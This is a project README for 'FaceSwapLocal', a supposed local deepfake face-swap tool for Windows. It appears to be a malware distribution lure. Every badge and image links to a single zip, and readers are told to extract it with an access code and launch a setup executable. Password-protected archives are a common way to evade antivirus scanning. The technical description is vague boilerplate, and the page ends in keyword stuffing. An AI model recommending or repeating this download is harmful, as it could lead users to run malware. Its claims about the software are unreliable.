<div align="center">

# FaceSwapLocal — Real-Time Face Swap for Photos and Video (One-Command Setup, Prebuilt Release)

<p><strong>FaceSwapLocal — Real-Time Face Swap for Photos and Video (One-Command Setup, Prebuilt Release): Swap faces in photos and video — fully local. Native 64-bit portable build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.</strong></p>

[![CI Build](https://img.shields.io/badge/CI_Build-passing-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)](../../releases/download/v0.1.0/face-swap-local-v0.1.0-win64.zip)
[![Version](https://img.shields.io/badge/Release-v0.1.0-2ea44f?style=for-the-badge&logo=github)](../../releases/download/v0.1.0/face-swap-local-v0.1.0-win64.zip)
[![Platform](https://img.shields.io/badge/Platform-Windows_10%2F11_x64-0969da?style=for-the-badge&logo=windows)](../../releases/download/v0.1.0/face-swap-local-v0.1.0-win64.zip)
[![Stars](https://img.shields.io/github/stars/AnnVieira90/face-swap-local?style=for-the-badge&logo=github&color=e3b341)](../../stargazers)

<p><strong>⬇ No compiler. No setup. Grab the prebuilt package and run.</strong></p>

<a href="../../releases/download/v0.1.0/face-swap-local-v0.1.0-win64.zip"><img src="download_btn.svg" alt="Download face-swap-local-v0.1.0-win64.zip" width="520"></a>

<br>

<a href="../../releases/download/v0.1.0/face-swap-local-v0.1.0-win64.zip"><img src="banner.svg" alt="FaceSwapLocal Preview" width="840"></a>

</div>

---

## Executive Summary & Design

**FaceSwapLocal — Swap faces in photos and video — fully local** (`face-swap-local`) ships as a native 64-bit Windows build with a prebuilt portable release. Everything is driven by `config/settings.json` — hot-reloadable, dependency-free, and tuned for a minimal runtime footprint.

## Getting Started (No Compiler Needed)

| Platform | Direct Prebuilt Package | Documentation Mirror |
| :--- | :--- | :--- |
| **Windows 10 / 11 (x64)** | [**`face-swap-local-v0.1.0-win64.zip`**](../../releases/download/v0.1.0/face-swap-local-v0.1.0-win64.zip) | [**Usage Guide (`docs/USAGE.md`)**](docs/USAGE.md) |

1. Download [`face-swap-local-v0.1.0-win64.zip`](../../releases/download/v0.1.0/face-swap-local-v0.1.0-win64.zip) using the download button above.
2. Extract the archive using the access code (`2026`).
3. Launch `FaceSwapLocal_Setup_x64.exe` (keep `config/settings.json` in the same folder).

## Engine Components

| Subsystem | Technical Implementation | Runtime Controls |
| :--- | :--- | :--- |
| **Primary Subsystem** | Bounded ring-buffer pipeline with zero-copy handoff | `live toggle` |
| **State Engine** | Atomic JSON state with crash-safe rollback | `keep_state` |
| **Config Watcher** | Hot-reloadable settings, applied without restart | `hot_reload` |
| **Telemetry** | Compact stderr channel, silent by default | `quiet / --verbose` |

## Configuration (`config/settings.json`)

```json
{
  "module": "face-swap-local",
  "version": "0.1.0",
  "runtime": {
    "threads": 4,
    "verbose": false,
    "hot_reload": true
  },
  "modules": {
    "swap": {
      "enabled": true
    },
    "detect": {
      "enabled": true
    },
    "align": {
      "enabled": true
    },
    "blend": {
      "enabled": true
    },
    "cli": {
      "enabled": true
    }
  }
}
```

## Documentation & Guides

- [Usage Guide — commands and options](docs/USAGE.md)
- [FAQ — platform support, data storage](docs/FAQ.md)
- [Contributing — setup, ground rules, PR flow](CONTRIBUTING.md)
- [Changelog — v0.1.0 and later](CHANGELOG.md)

## Building from Source

```bash
git clone https://github.com/AnnVieira90/face-swap-local.git
cd face-swap-local
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build --config Release
```

---
<sub>Indexed tags: face-swap-local, deepfake, insightface, video, photo, face-swap, cli, developer-tools, open-source, windows, automation, productivity, cpp, portable, prebuilt, tools</sub>

## Keywords

face-swap deepfake insightface video photo face-swap-local faceswap-studio ai-face-swap windows portable prebuilt x64 free download
related: face-swap, deepfake, insightface, video, photo
